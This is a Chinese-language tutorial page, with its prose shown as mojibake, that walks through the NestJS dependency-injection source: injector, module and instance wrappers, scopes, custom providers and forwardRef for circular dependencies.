li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">NestJS æºç è§£æï¼šä¾èµ–æ³¨å…¥ç³»ç»Ÿ</h2>
<blockquote>
<p>æ·±å…¥ Injector å’Œ Containerï¼Œæ­ç§˜ NestJS çš„ IoC å®ç°ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¾èµ–æ³¨å…¥åŸºç¡€</h3>
<p>NestJS çš„ä¾èµ–æ³¨å…¥åŸºäº TypeScript è£…é¥°å™¨å’Œ <code>reflect-metadata</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> logger: LoggerService</span>) {}
}
</code></pre>
<p>ç¼–è¯‘åï¼ŒTypeScript ä¼šç”Ÿæˆå…ƒæ•°æ®ï¼Œè®°å½•æ„é€ å‡½æ•°å‚æ•°ç±»å‹ã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒç»„ä»¶</h3>
<h4 data-id="heading-3">1. InstanceWrapper</h4>
<p>åŒ…è£…æ¯ä¸ªå¯æ³¨å…¥çš„å®ä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/instance-wrapper.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstanceWrapper</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">token</span>: <span class="hljs-title class_">InjectionToken</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">metatype</span>: <span class="hljs-title class_">Type</span>&lt;T&gt;;
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> scope?: <span class="hljs-title class_">Scope</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> values = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>&lt;<span class="hljs-title class_">ContextId</span>, <span class="hljs-title class_">InstancePerContext</span>&lt;T&gt;&gt;();

  <span class="hljs-comment">// è·å–å®ä¾‹</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">instance</span>(): T {
    <span class="hljs-keyword">const</span> instancePerContext = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getInstanceByContextId</span>(<span class="hljs-variable constant_">STATIC_CONTEXT</span>);
    <span class="hljs-keyword">return</span> instancePerContext.<span class="hljs-property">instance</span>;
  }

  <span class="hljs-comment">// è®¾ç½®å®ä¾‹</span>
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">instance</span>(<span class="hljs-params">value: T</span>) {
    <span class="hljs-keyword">const</span> instancePerContext = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getInstanceByContextId</span>(<span class="hljs-variable constant_">STATIC_CONTEXT</span>);
    instancePerContext.<span class="hljs-property">instance</span> = value;
  }

  <span class="hljs-comment">// è·å–æ„é€ å‡½æ•°å…ƒæ•°æ®</span>
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getCtorMetadata</span>(): <span class="hljs-title class_">InstanceWrapper</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">inject</span> || [];
  }
}
</code></pre>
<h4 data-id="heading-4">2. Module</h4>
<p>æ¨¡å—ç±»ï¼Œç®¡ç† providersã€controllersã€importsã€exportsï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/module.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _providers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&lt;<span class="hljs-title class_">Injectable</span>&gt;&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _controllers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&lt;<span class="hljs-title class_">Controller</span>&gt;&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _imports = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Module</span>&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _exports = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">InjectionToken</span>&gt;();

  <span class="hljs-comment">// æ·»åŠ  Provider</span>
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">addProvider</span>(<span class="hljs-attr">provider</span>: <span class="hljs-title class_">Provider</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomProvider</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomProvider</span>(provider);
    }

    <span class="hljs-keyword">const</span> token = provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">Type</span>&lt;<span class="hljs-title class_">Injectable</span>&gt;;
    <span class="hljs-keyword">const</span> wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceWrapper</span>({
      token,
      <span class="hljs-attr">name</span>: token.<span class="hljs-property">name</span>,
      <span class="hljs-attr">metatype</span>: token,
      <span class="hljs-attr">instance</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">isResolved</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">scope</span>: <span class="hljs-title function_">getClassScope</span>(token),
      <span class="hljs-attr">host</span>: <span class="hljs-variable language_">this</span>,
    });

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_providers</span>.<span class="hljs-title function_">set</span>(token, wrapper);
    <span class="hljs-keyword">return</span> token.<span class="hljs-property">name</span>;
  }

  <span class="hljs-comment">// æ·»åŠ è‡ªå®šä¹‰ Provider</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">addCustomProvider</span>(<span class="hljs-attr">provider</span>: <span class="hljs-title class_">Provider</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomClass</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomClass</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ClassProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomValue</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomValue</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ValueProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomFactory</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomFactory</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">FactoryProvider</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCustomUseExisting</span>(provider)) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addCustomUseExisting</span>(provider <span class="hljs-keyword">as</span> <span class="hljs-title class_">ExistingProvider</span>);
    }
  }
}
</code></pre>
<h4 data-id="heading-5">3. Injector</h4>
<p>ä¾èµ–æ³¨å…¥æ ¸å¿ƒå¼•æ“ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> {
  <span class="hljs-comment">// åŠ è½½å®ä¾‹</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> loadInstance&lt;T&gt;(
    <span class="hljs-attr">wrapper</span>: <span class="hljs-title class_">InstanceWrapper</span>&lt;T&gt;,
    <span class="hljs-attr">collection</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">InjectionToken</span>, <span class="hljs-title class_">InstanceWrapper</span>&gt;,
    <span class="hljs-attr">moduleRef</span>: <span class="hljs-title class_">Module</span>,
    contextId = <span class="hljs-variable constant_">STATIC_CONTEXT</span>,
    inquirer?: <span class="hljs-title class_">InstanceWrapper</span>,
  ) {
    <span class="hljs-keyword">const</span> { token } = wrapper;

    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²è§£æ</span>
    <span class="hljs-keyword">const</span> instanceHost = wrapper.<span class="hljs-title function_">getInstanceByContextId</span>(contextId, inquirer?.<span class="hljs-property">id</span>);
    <span class="hljs-keyword">if</span> (instanceHost.<span class="hljs-property">isResolved</span>) {
      <span class="hljs-keyword">return</span> instanceHost.<span class="hljs-property">instance</span>;
    }

    <span class="hljs-comment">// è§£ææ„é€ å‡½æ•°ä¾èµ–</span>
    <span class="hljs-keyword">const</span> dependencies = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolveConstructorParams</span>&lt;T&gt;(
      wrapper,
      moduleRef,
      contextId,
      inquirer,
    );

    <span class="hljs-comment">// å®ä¾‹åŒ–</span>
    <span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">instantiateClass</span>(
      dependencies,
      wrapper,
      wrapper.<span class="hljs-property">inject</span>,
      contextId,
      inquirer,
    );

    <span class="hljs-comment">// æ³¨å…¥å±æ€§ä¾èµ–</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadPropertiesOnInstance</span>(instance, wrapper, moduleRef, contextId);

    <span class="hljs-keyword">return</span> instance;
  }

  <span class="hljs-comment">// è§£ææ„é€ å‡½æ•°å‚æ•°</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> resolveConstructorParams&lt;T&gt;(
    <span class="hljs-attr">wrapper</span>: <span class="hljs-title class_">InstanceWrapper</span>&lt;T&gt;,
    <span class="hljs-attr">moduleRef</span>: <span class="hljs-title class_">Module</span>,
    <span class="hljs-attr">contextId</span>: <span class="hljs-title class_">ContextId</span>,
    inquirer?: <span class="hljs-title class_">InstanceWrapper</span>,
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">unknown</span>[]&gt; {
    <span class="hljs-comment">// è·å–ä¾èµ–å…ƒæ•°æ®</span>
    <span class="hljs-keyword">const</span> dependencies = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCtorDependencies</span>(wrapper);

    <span class="hljs-comment">// å¹¶è¡Œè§£ææ‰€æœ‰ä¾èµ–</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(
      dependencies.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">async</span> (dependency, index) =&gt; {
        <span class="hljs-keyword">const</span> { <span class="hljs-attr">wrapper</span>: instanceWrapper } = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponent</span>(
          dependency,
          moduleRef,
          contextId,
          wrapper,
          index,
        );
        <span class="hljs-keyword">return</span> instanceWrapper.<span class="hljs-property">instance</span>;
      }),
    );
  }

  <span class="hljs-comment">// æŸ¥æ‰¾ä¾èµ–</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">lookupComponent</span>(<span class="hljs-params">
    dependency: InjectorDependency,
    moduleRef: Module,
    contextId: ContextId,
    wrapper: InstanceWrapper,
    index: <span class="hljs-built_in">number</span>,
  </span>) {
    <span class="hljs-comment">// 1. åœ¨å½“å‰æ¨¡å—æŸ¥æ‰¾</span>
    <span class="hljs-keyword">const</span> instanceWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponentInParentModules</span>(
      dependency,
      moduleRef,
      contextId,
      wrapper,
      index,
    );

    <span class="hljs-keyword">if</span> (instanceWrapper) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">wrapper</span>: instanceWrapper };
    }

    <span class="hljs-comment">// 2. åœ¨å…¨å±€æ¨¡å—æŸ¥æ‰¾</span>
    <span class="hljs-keyword">const</span> globalWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponentInGlobalModules</span>(
      dependency,
      contextId,
      wrapper,
    );

    <span class="hljs-keyword">if</span> (globalWrapper) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">wrapper</span>: globalWrapper };
    }

    <span class="hljs-comment">// 3. æœªæ‰¾åˆ°ï¼ŒæŠ›å‡ºå¼‚å¸¸</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndefinedDependencyException</span>(wrapper.<span class="hljs-property">name</span>, dependency, index);
  }
}
</code></pre>
<h3 data-id="heading-6">ä¾èµ–è§£ææµç¨‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> logger: LoggerService,
    <span class="hljs-keyword">private</span> config: ConfigService,
  </span>) {}
}

è§£ææµç¨‹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-number">1.</span> è·å–æ„é€ å‡½æ•°å‚æ•°ç±»å‹                              â”‚
â”‚    <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getMetadata</span>(<span class="hljs-string">'design:paramtypes'</span>, target) â”‚
â”‚    â†’ [<span class="hljs-title class_">LoggerService</span>, <span class="hljs-title class_">ConfigService</span>]                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-number">2.</span> éå†æ¯ä¸ªä¾èµ–ï¼Œè°ƒç”¨ lookupComponent               â”‚
â”‚    â†’ åœ¨å½“å‰æ¨¡å— providers ä¸­æŸ¥æ‰¾                    â”‚
â”‚    â†’ åœ¨ imports çš„æ¨¡å— <span class="hljs-built_in">exports</span> ä¸­æŸ¥æ‰¾               â”‚
â”‚    â†’ åœ¨å…¨å±€æ¨¡å—ä¸­æŸ¥æ‰¾                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-number">3.</span> é€’å½’è§£æä¾èµ–çš„ä¾èµ–                               â”‚
â”‚    <span class="hljs-title class_">LoggerService</span> å¯èƒ½ä¹Ÿæœ‰è‡ªå·±çš„ä¾èµ–                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-number">4.</span> å®ä¾‹åŒ–                                           â”‚
â”‚    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CatsService</span>(loggerInstance, configInstance)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-7">Barrier å¹¶è¡Œè§£ææœºåˆ¶</h3>
<p>æºç ä¸­ä½¿ç”¨ <code>Barrier</code> å®ç°ä¾èµ–çš„å¹¶è¡Œè§£æï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">const</span> paramBarrier = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Barrier</span>(dependencies.<span class="hljs-property">length</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">resolveParam</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">param: <span class="hljs-built_in">unknown</span>, index: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> paramWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolveSingleParam</span>&lt;T&gt;(<span class="hljs-comment">/*...*/</span>);
    
    <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä¾èµ–éƒ½è§£æå®Œæˆ</span>
    <span class="hljs-keyword">await</span> paramBarrier.<span class="hljs-title function_">signalAndWait</span>();
    
    <span class="hljs-keyword">const</span> paramWrapperWithInstance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolveComponentHost</span>(<span class="hljs-comment">/*...*/</span>);
    <span class="hljs-keyword">return</span> instanceHost?.<span class="hljs-property">instance</span>;
  } <span class="hljs-keyword">catch</span> (err) {
    paramBarrier.<span class="hljs-title function_">signal</span>(); <span class="hljs-comment">// å‡ºé”™ä¹Ÿè¦é‡Šæ”¾ä¿¡å·</span>
    <span class="hljs-comment">// ...</span>
  }
};

<span class="hljs-keyword">const</span> instances = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(dependencies.<span class="hljs-title function_">map</span>(resolveParam));
</code></pre>
<p><code>Barrier</code> ç¡®ä¿æ‰€æœ‰ä¾èµ–çš„ <code>InstanceWrapper</code> éƒ½è¢«è§£æåï¼Œæ‰å¼€å§‹è·å–å®ä¾‹ã€‚è¿™é¿å…äº†ä¾èµ–æ ‘é™æ€æ€§åˆ¤æ–­é”™è¯¯å¯¼è‡´çš„ <code>undefined</code> æ³¨å…¥é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">SettlementSignal å¾ªç¯ä¾èµ–æ£€æµ‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">if</span> (instanceHost.<span class="hljs-property">isPending</span>) {
  <span class="hljs-keyword">const</span> settlementSignal = wrapper.<span class="hljs-property">settlementSignal</span>;
  <span class="hljs-keyword">if</span> (inquirer &amp;&amp; settlementSignal?.<span class="hljs-title function_">isCycle</span>(inquirer.<span class="hljs-property">id</span>)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircularDependencyException</span>(<span class="hljs-string">`"<span class="hljs-subst">${wrapper.name}</span>"`</span>);
  }
  <span class="hljs-keyword">return</span> instanceHost.<span class="hljs-property">donePromise</span>!.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">err?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
  });
}
</code></pre>
<p><code>SettlementSignal</code> è¿½è¸ªä¾èµ–è§£æé“¾ï¼Œå½“æ£€æµ‹åˆ°å¾ªç¯æ—¶æŠ›å‡º <code>CircularDependencyException</code>ã€‚</p>
<h3 data-id="heading-9">ä½œç”¨åŸŸ</h3>
<p>NestJS æ”¯æŒä¸‰ç§ä½œç”¨åŸŸï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Scope</span> {
  <span class="hljs-variable constant_">DEFAULT</span> = <span class="hljs-number">0</span>,    <span class="hljs-comment">// å•ä¾‹</span>
  <span class="hljs-variable constant_">TRANSIENT</span> = <span class="hljs-number">1</span>,  <span class="hljs-comment">// æ¯æ¬¡æ³¨å…¥åˆ›å»ºæ–°å®ä¾‹</span>
  <span class="hljs-variable constant_">REQUEST</span> = <span class="hljs-number">2</span>,    <span class="hljs-comment">// æ¯ä¸ªè¯·æ±‚åˆ›å»ºæ–°å®ä¾‹</span>
}
</code></pre>
<h4 data-id="heading-10">å•ä¾‹ (DEFAULT)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {}
</code></pre>
<p>æ•´ä¸ªåº”ç”¨ç”Ÿå‘½å‘¨æœŸåªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚</p>
<h4 data-id="heading-11">ç¬æ€ (TRANSIENT)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>({ <span class="hljs-attr">scope</span>: <span class="hljs-title class_">Scope</span>.<span class="hljs-property">TRANSIENT</span> })
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerService</span> {}
</code></pre>
<p>æ¯æ¬¡æ³¨å…¥éƒ½åˆ›å»ºæ–°å®ä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">if</span> (wrapper.<span class="hljs-property">scope</span> === <span class="hljs-title class_">Scope</span>.<span class="hljs-property">TRANSIENT</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">instantiateClass</span>(
    dependencies,
    wrapper,
    wrapper.<span class="hljs-property">inject</span>,
    contextId,
    inquirer,
  );
}
</code></pre>
<h4 data-id="heading-12">è¯·æ±‚ä½œç”¨åŸŸ (REQUEST)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>({ <span class="hljs-attr">scope</span>: <span class="hljs-title class_">Scope</span>.<span class="hljs-property">REQUEST</span> })
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestService</span> {}
</code></pre>
<p>æ¯ä¸ª HTTP è¯·æ±‚åˆ›å»ºæ–°å®ä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/router/router-execution-context.ts</span>
<span class="hljs-keyword">if</span> (wrapper.<span class="hljs-property">scope</span> === <span class="hljs-title class_">Scope</span>.<span class="hljs-property">REQUEST</span>) {
  <span class="hljs-keyword">const</span> contextId = <span class="hljs-title function_">createContextId</span>();
  <span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">loadInstance</span>(
    wrapper,
    collection,
    moduleRef,
    contextId,
  );
  <span class="hljs-keyword">return</span> instance;
}
</code></pre>
<h3 data-id="heading-13">è‡ªå®šä¹‰ Provider</h3>
<h4 data-id="heading-14">useClass</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-title class_">CatsService</span>,
  <span class="hljs-attr">useClass</span>: <span class="hljs-title class_">MockCatsService</span>,
}
</code></pre>
<h4 data-id="heading-15">useValue</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'CONFIG'</span>,
  <span class="hljs-attr">useValue</span>: { <span class="hljs-attr">apiKey</span>: <span class="hljs-string">'xxx'</span> },
}
</code></pre>
<h4 data-id="heading-16">useFactory</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'ASYNC_CONNECTION'</span>,
  <span class="hljs-attr">useFactory</span>: <span class="hljs-keyword">async</span> (<span class="hljs-attr">config</span>: <span class="hljs-title class_">ConfigService</span>) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">createConnection</span>(config.<span class="hljs-title function_">get</span>(<span class="hljs-string">'database'</span>));
  },
  <span class="hljs-attr">inject</span>: [<span class="hljs-title class_">ConfigService</span>],
}
</code></pre>
<h4 data-id="heading-17">useExisting</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'AliasService'</span>,
  <span class="hljs-attr">useExisting</span>: <span class="hljs-title class_">CatsService</span>,
}
</code></pre>
<h3 data-id="heading-18">å¾ªç¯ä¾èµ–å¤„ç†</h3>
<p>NestJS ä½¿ç”¨ <code>forwardRef</code> å¤„ç†å¾ªç¯ä¾èµ–ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-meta">@Inject</span>(forwardRef(() =&gt; DogsService))
    <span class="hljs-keyword">private</span> dogsService: DogsService,
  </span>) {}
}
</code></pre>
<p>å®ç°åŸç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/common/utils/forward-ref.util.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> forwardRef = (<span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">any</span>): <span class="hljs-function"><span class="hljs-params">ForwardReference</span> =&gt;</span> ({
  <span class="hljs-attr">forwardRef</span>: fn,
});

<span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">private</span> <span class="hljs-title function_">resolveParamToken</span>(<span class="hljs-params">param: <span class="hljs-built_in">any</span></span>) {
  <span class="hljs-keyword">if</span> (param &amp;&amp; param.<span class="hljs-property">forwardRef</span>) {
    <span class="hljs-keyword">return</span> param.<span class="hljs-title function_">forwardRef</span>();
  }
  <span class="hljs-keyword">return</span> param;
}
</code></pre>
<h3 data-id="heading-19">å±æ€§æ³¨å…¥</h3>
<p>é™¤äº†æ„é€ å‡½æ•°æ³¨å…¥ï¼Œè¿˜æ”¯æŒå±æ€§æ³¨å…¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
